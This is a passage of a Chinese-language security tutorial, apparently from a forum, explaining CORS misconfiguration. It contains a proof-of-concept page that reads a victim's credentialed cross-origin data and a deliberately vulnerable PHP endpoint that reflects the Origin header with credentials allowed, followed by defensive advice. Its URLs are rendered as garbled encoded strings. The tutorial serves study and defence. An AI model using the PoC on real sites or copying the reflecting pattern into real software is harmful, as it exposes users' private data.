
### 漏洞页面代码分析

```html
<html>
<head>
<script type="text/javascript">
window.onload = function cors() {
var xhttp = new XMLHttpRequest();
xhttp.onreadystatechange = function() {
if (this.readyState === 4 && this.status === 200) {
document.getElementById("demo").innerHTML = alert(this.responseText);
}
};
xhttp.open("GET", "33bK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8U0p5H3i4K6u0W2x3U0l9H3i4K6u0W2y4K6m8Q4x3X3f1J5y4#2)9J5c8Y4k6#2L8q4)9J5c8V1c8G2M7X3q4n7L8%4S2Q4x3V1k6U0M7%4u0X3i4K6u0r3N6i4y4W2M7X3W2F1k6X3!0Q4x3X3g2H3K9s2l9", true);
xhttp.send();
}
</script>
</head>
<body>
<textarea id="demo"></textarea>
</body>
</html>
```

```php
<?php
if (@$_SERVER['HTTP_ORIGIN']){
header("Access-Control-Allow-Origin: ".$_SERVER['HTTP_ORIGIN']);
}else{
header("Access-Control-Allow-Origin: *");
}
header("Access-Control-Allow-Headers: X-Requested-With");
header("Access-Control-Allow-Credentials: true");
header("Access-Control-Allow-Methods: PUT,POST,GET,DELETE,OPTIONS");

$info = array('username' => 'Vulkey_Chen','mobilephone' => '13188888888','email' => 'admin@gh0st.cn','address' => '中华人民共和国','sex' => 'Cool Man');
echo json_encode($info);
?>
```

首先你判断是否请求头里面是否有`Origin`如果有，就讲`header`设置为`(Access-Control-Allow-Origin: "传进来的Origin")`如果没有就设置为`*`，在设置不同的`header`，最后`echo json`

把这些`header`删掉，就会触发同源策略，就无法获得想要的`json`信息

![image-20210720154126549](https://bbs.kanxue.com/upload/attach/202107/809626_JJXHT2BT94BY2WX.jpg)

删掉后还是正常输出`json`内容

![image-20210720154143973](https://bbs.kanxue.com/upload/attach/202107/809626_8VEKYGKUNQ69HRD.jpg)

但是使用不同域模拟受害者点击的时候就会提示

![image-20210720154221640](https://bbs.kanxue.com/upload/attach/202107/809626_BQV8TP63V6FFF3W.jpg)

### 4、Cors跨域的个人理解

同源策略不允许其他的源访问，所以如果错误的配置了`Access-Control-Allow-Origin`，导致攻击者可以控制这个`Origin`的话，就会导致我只需要指定当前访问地址的源即可。

如果使用`Access-Control-Allow-Origin`来处理跨域的话，如果没有传入`Origin`参数，那么就会使用默认的值，这个默认的值浏览器会将当前的`host`传进去，所以在请求中可以看到返回包里面`Origin`是当前的`host`

![image-20210720155652341](https://bbs.kanxue.com/upload/attach/202107/809626_NKNZ7RMZ9A29SKE.jpg)

![image-20210720155756120](https://bbs.kanxue.com/upload/attach/202107/809626_H66SUKECZS4BT2V.jpg)

### 5、Cors防御思路

- 白名单
- 规范化正则表达式
- 只允许安全的协议如`https`
- 避免使用`Access-Control-Allow-Credentials`为`True`
- 使用框架的时候注意查看相关文档的用法,根据上面规则进行更正。

参考文章

1、`edcK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4N6W2K9i4S2A6L8W2)9#2k6U0b7I4y4U0M7&6y4o6t1%4i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5I4x3e0l9K6x3e0t1K6z5o6R3`.

2、`75aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2A6L8h3!0G2j5#2)9J5k6h3y4G2L8g2)9J5c8X3q4J5N6r3W2U0L8r3g2Q4x3V1j5J5z5e0p5&6x3K6p5`.

3、`d9dK9s2c8@1M7q4)9K6b7g2)9J5c8W2)9J5c8Y4N6%4N6#2)9J5k6i4u0#2j5h3&6&6K9h3k6W2L8X3N6Q4x3X3g2U0L8$3#2Q4x3V1k6T1L8r3!0Y4i4K6u0r3x3U0l9I4y4W2)9J5c8U0l9@1i4K6u0r3j5$3!0J5M7#2)9J5k6h3S2@1L8h3H3`.

4、`5b2K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6T1L8r3!0Y4i4K6u0W2j5%4y4V1L8W2)9J5k6h3&6W2N6q4)9J5c8Y4N6W2K9i4S2A6L8W2)9#2k6U0b7I4y4e0V1^5y4U0j5H3i4K6u0r3j5i4u0@1K9h3y4D9k6g2)9J5c8X3c8W2N6r3q4A6L8s2y4Q4x3V1j5I4x3o6j5H3y4e0l9&6y4e0M7`.

5、`0d5K9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6%4N6%4N6Q4x3X3g2U0L8X3u0D9L8$3N6K6i4K6u0W2j5$3!0E0i4K6u0r3j5%4y4F1k6q4)9J5c8Y4m8Q4x3V1j5I4x3e0R3H3y4K6M7H3z5g2)9J5k6h3S2@1L8h3H3`.

[冰与火的战歌：Windows内核攻防实战高级班！从零到实战，融合AI与Windows内核攻防全技术栈，打造具备自动化能力的内核开发高手。](https://www.kanxue.com/book-section_list-227.htm)
